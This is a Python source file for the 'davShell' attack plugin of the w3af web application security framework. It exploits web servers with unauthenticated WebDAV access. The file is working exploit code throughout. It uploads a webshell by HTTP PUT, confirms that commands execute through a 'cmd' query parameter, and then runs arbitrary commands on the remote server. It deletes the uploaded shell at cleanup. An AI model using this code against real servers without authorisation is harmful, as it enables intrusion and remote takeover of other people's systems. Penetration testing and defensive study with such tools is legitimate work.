'''
davShell.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


from core.data.fuzzer.fuzzer import *
import core.controllers.outputManager as om
# options
from core.data.options.option import option
from core.data.options.optionList import optionList
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin

import core.data.kb.knowledgeBase as kb
import core.data.kb.vuln as vuln
from core.data.kb.shell import shell as shell

import core.data.parsers.urlParser as urlParser
from core.controllers.w3afException import w3afException

from plugins.attack.webshells.getShell import getShell
import urllib

class davShell(baseAttackPlugin):
    '''
    Exploit web servers that have unauthenticated DAV access.
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # User configured variables
        self._url = ''
        self._generateOnlyOne = True
        
    def fastExploit( self ):
        '''
        Exploits a web app with unauthenticated dav access.
        '''
        if self._url == '':
            om.out.error('You have to configure the "url" parameter.')
        else:
            v = vuln.vuln()
            v.setURL( self._url )
            kb.kb.append( 'dav', 'dav', v )
    
    def getAttackType(self):
        return 'shell'
        
    def getVulnName2Exploit( self ):
        return 'dav'
    
    def _generateShell( self, vuln ):
        '''
        @parameter vuln: The vuln to exploit.
        @return: The shell object based on the vulnerability that was passed as a parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verifyVuln( vuln ):
            # Create the shell object
            s = davShellObj( vuln )
            s.setUrlOpener( self._urlOpener )
            s.setExploitURL( self._exploit )
            return s
        else:
            return None

    def _verifyVuln( self, vuln ):
        '''
        This command verifies a vuln. This is really hard work! :P

        @return : True if vuln can be exploited.
        '''
        # Create the shell
        filename = createRandAlpha( 7 )
        extension = urlParser.getExtension( vuln.getURL() )
        
        # I get a list of tuples with fileContent and extension to use
        shellList = getShell( extension )
        
        for fileContent, realExtension in shellList:
            if extension == '':
                extension = realExtension
            om.out.debug('Uploading shell with extension: "'+extension+'".' )
            
            # Upload the shell
            urlToUpload = urlParser.urlJoin( vuln.getURL() , filename + '.' + extension )
            om.out.debug('Uploading file: ' + urlToUpload )
            self._urlOpener.PUT( urlToUpload, data=fileContent )
            
            # Verify if I can execute commands
            rnd = createRandAlNum(6)
            cmd = 'echo+%22' + rnd + '%22'
            
            self._exploit = urlParser.getDomainPath( vuln.getURL() ) + filename + '.' + extension + '?cmd='
            toSend = self._exploit + cmd
            
            response = self._urlOpener.GET( toSend )
            if response.getBody().count( rnd ):
                om.out.debug('The uploaded shell returned what we expected: ' + rnd )
                return True
            else:
                om.out.debug('The uploaded shell with extension: "'+extension+'" DIDN\'T returned what we expected, it returned : ' + response.getBody() )
                extension = ''
    
    def getOptionsXML(self):
        '''
        This method returns a XML containing the Options that the plugin has.
        Using this XML the framework will build a window, a menu, or some other input method to retrieve
        the info from the user. The XML has to validate against the xml schema file located at :
        w3af/core/ui/userInterface.dtd
        
        @return: XML with the plugin options.
        ''' 
        return  '<?xml version="1.0" encoding="ISO-8859-1"?>\
        <OptionList>\
            <Option name="url">\
                <default>'+self._url+'</default>\
                <desc>URL to exploit with fastExploit()</desc>\
                <type>string</type>\
            </Option>\
            <Option name="generateOnlyOne">\
                <default>'+str(self._generateOnlyOne)+'</default>\
                <desc>If true, this plugin will try to generate only one shell object.</desc>\
                <type>boolean</type>\
            </Option>\
        </OptionList>\
        '

    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptionsXML().
        
        @parameter optionsMap: A dictionary with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._url = optionsMap['url']
        self._generateOnlyOne = optionsMap['generateOnlyOne']

    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return ['discovery.serverHeader']

    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.8
        
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits webDAV misconfigurations and returns a shell. It's rather simple, using the dav method
        "PUT" the plugin uploads the corresponding webshell ( php, asp, etc. ) verifies that the shell is working, and if
        everything is working as expected the user can start typing commands.
        
        No configurable parameters exist.
        '''
        
class davShellObj(shell):
    def setExploitURL( self, eu ):
        self._exploit = eu
    
    def getExploitURL( self ):
        return self._exploit
        
    def _rexec( self, command ):
        '''
        This method is called when a command is being sent to the remote server.
        This is a NON-interactive shell.

        @parameter command: The command to send ( ie. "ls", "whoami", etc ).
        @return: The result of the command.
        '''
        toSend = self.getExploitURL() + urllib.quote_plus( command )
        response = self._urlOpener.GET( toSend )
        return response.getBody()
    
    def end( self ):
        om.out.debug('davShellObj is going to delete the webshell that was uploaded before.')
        urlToDel = urlParser.uri2url( self._exploit )
        try:
            self._urlOpener.DELETE( urlToDel )
        except Exception, e:
            om.out.error('davShellObj cleanup failed with exception: ' + str(e) )
        else:
            om.out.debug('davShellObj cleanup complete.')
        
    def getName( self ):
        return 'davShell'
